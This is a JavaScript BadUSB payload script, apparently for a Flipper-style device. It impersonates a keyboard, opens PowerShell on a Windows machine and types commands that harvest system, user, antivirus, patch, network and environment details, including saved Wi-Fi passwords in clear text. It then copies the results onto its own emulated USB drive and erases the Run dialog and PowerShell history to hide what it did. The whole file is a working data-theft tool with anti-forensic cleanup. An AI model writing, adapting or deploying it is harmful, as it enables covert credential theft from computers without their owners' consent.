// Configuration for Mass Storage
const storagePath = "/ext/apps_data/mass_storage/SecureData.img";
const storageSize = 8 * 1024 * 1024;

// Custom commands to execute on the target system
const commandList = [
    "$Date = Get-Date -Format yyyy-MM-dd;",
    "$Time = Get-Date -Format HH-mm-ss;",
    "Get-CimInstance -ClassName Win32_ComputerSystem | Out-File -FilePath system_info.txt -Append;",
    "Get-LocalUser | Out-File -FilePath system_info.txt -Append;",
    "Get-LocalUser | Where-Object {$_.PasswordRequired -eq $false} | Out-File -FilePath system_info.txt -Append;",
    "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath system_info.txt -Append;",
    "Get-CimInstance -ClassName Win32_QuickFixEngineering | Out-File -FilePath system_info.txt -Append;",
    "(netsh wlan show profiles) | Select-String '\:(.+)$' | ForEach-Object { $profile = $_.Matches.Groups[1].Value.Trim(); (netsh wlan show profile name=$profile key=clear) } | Select-String 'Key Content\\W+\\:(.+)$' | ForEach-Object { [PSCustomObject]@{Profile=$_.Matches.Groups[1].Value.Trim(); Password=$_.Matches.Groups[2].Value.Trim()} } | Format-Table -AutoSize | Out-File -FilePath system_info.txt -Append;",
    "Get-ChildItem env: | Out-File -FilePath system_info.txt -Append;",
    "Get-ComputerInfo | Out-File -FilePath system_info.txt -Append;",
    "Get-Service | Out-File -FilePath system_info.txt -Append;",
    "Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)'} | Select-Object IPAddress,SuffixOrigin | Out-File -FilePath system_info.txt -Append;",
    "Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'} | Out-File -FilePath system_info.txt -Append;",
    "Get-NetTCPConnection | Select-Object -Property * | Out-File -FilePath system_info.txt -Append;"
];

// Combine all commands into a single string
let combinedCommands = "";
for (let cmd of commandList) {
    combinedCommands += cmd + "\n";
}

// Required modules
const badusbModule = require("badusb");
const usbdiskModule = require("usbdisk");
const storageModule = require("storage");

// Check if the storage image exists
print("Checking for storage image...");
if (storageModule.fileExists(storagePath)) {
    print("Storage image found.");
} else {
    print("Creating new storage image...");
    usbdiskModule.createImage(storagePath, storageSize);
}

// Configure BadUSB device
badusbModule.setup({
    vid: 0xCCCC,
    pid: 0xDDDD,
    mfrName: "CustomDevice",
    prodName: "DataCollector",
    layoutPath: "/ext/badusb/assets/layouts/en-US.kl"
});

print("Waiting for USB connection...");
while (!badusbModule.isConnected()) {
    delay(1000);
}

// Begin execution
badusbModule.press("GUI", "x"); // Open admin tools menu
delay(300);
badusbModule.press("i"); // Select PowerShell
delay(3000);

// Uncomment the following block if you want to use "Run" instead of the admin tools menu
/*
badusbModule.press("GUI", "r"); // Open Run dialog
delay(300);
badusbModule.println("powershell");
badusbModule.press("ENTER");
*/

print("Executing payload...");
badusbModule.println(combinedCommands, 10); // Execute the combined commands
badusbModule.press("ENTER");

// Additional cleanup commands
badusbModule.println(
    "echo 'Please wait until this window closes to safely eject the drive.';" +
    "Start-Sleep 10;" +
    "$DriveLetter = (Get-Disk | Where-Object {$_.FriendlyName -eq 'Custom Mass Storage'}) | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;" +
    "New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\;" +
    "Move-Item -Path system_info.txt -Destination ${DriveLetter}:\\${Date}\\${env:COMPUTERNAME}_${Time}.txt;" +
    "Remove-Item system_info.txt;" +
    "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;" +
    "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;" +
    "exit"
);
badusbModule.press("ENTER");

// Disconnect BadUSB
badusbModule.quit();
delay(2000);

// Start the mass storage device
usbdiskModule.start(storagePath);
print("Please wait until the PowerShell window closes before ejecting...");

// Monitor for ejection
while (!usbdiskModule.wasEjected()) {
    delay(1000);
}

// Stop the mass storage device
usbdiskModule.stop();
print("Operation complete.");